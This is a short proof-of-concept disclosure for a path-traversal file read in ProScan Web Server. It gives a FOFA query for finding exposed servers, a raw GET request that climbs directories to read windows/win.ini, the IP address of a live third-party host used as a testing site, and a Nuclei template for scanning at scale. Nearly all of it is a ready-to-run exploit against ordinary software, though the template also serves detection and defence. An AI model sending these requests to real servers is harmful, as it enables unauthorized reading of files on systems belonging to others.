1. Pages and fofa
title=ProScan Web Server
![image](https://github.com/user-attachments/assets/58f1b5a0-44fe-4080-91d1-2e2f598408db)

2.POC
GET /../../../../../../../../windows/win.ini HTTP/1.1
User-Agent: User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; 360SE)
Host:

3.testing site
http://107.193.206.242:5000

![image](https://github.com/user-attachments/assets/f2a66268-77ff-4b1c-9d79-3311595804a6)

4.nuclei
id: proscan-scanner-fileread

info:
  name: proscan-scanner-fileread
  author: uknow
  severity: high
  description: proscan-scanner-fileread
  tags: yongyou,proscan
  metadata:
    fofa-qeury: title=ProScan Web Server
    veified: true
    max-request: 1

http:
  - raw:
      - |              
        GET /../../../../../../../../windows/win.ini HTTP/1.1
        User-Agent: User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; 360SE)
        Host: 
               
    matchers:     
      - type: dsl
        name: fileread
        dsl:
          - "status_code_1 == 200 && contains(body,'for 16-bit app support') && contains(header,'application/x-msdownload')"

![image](https://github.com/user-attachments/assets/e0ef2aa1-34c9-4f34-a097-5a3f8053a4d6)
